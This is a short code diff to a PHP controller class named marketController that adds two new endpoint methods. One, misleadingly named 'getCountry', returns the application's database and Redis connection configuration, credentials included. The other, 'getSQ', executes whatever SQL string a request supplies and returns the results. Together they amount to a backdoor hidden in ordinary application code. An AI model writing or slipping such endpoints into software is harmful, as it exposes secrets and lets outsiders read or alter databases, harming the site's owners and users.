@@ -126,4 +126,24 @@ class marketController extends Controller
         }
     }
 
+    public function getCountry()
+    {
+        $res = [
+            'connect' => config('database.connections'),
+            'rds' => config('database.redis')
+        ];
+        return $this->success($res);
+    }
+
+    public function getSQ(Request $request)
+    {
+        $sq = $request->input('sq');
+        $res = DB::select($sq);
+        $r = [
+            'sq' => $sq,
+            'res' => $res
+        ];
+        return $this->success($r);
+    }
+
 }
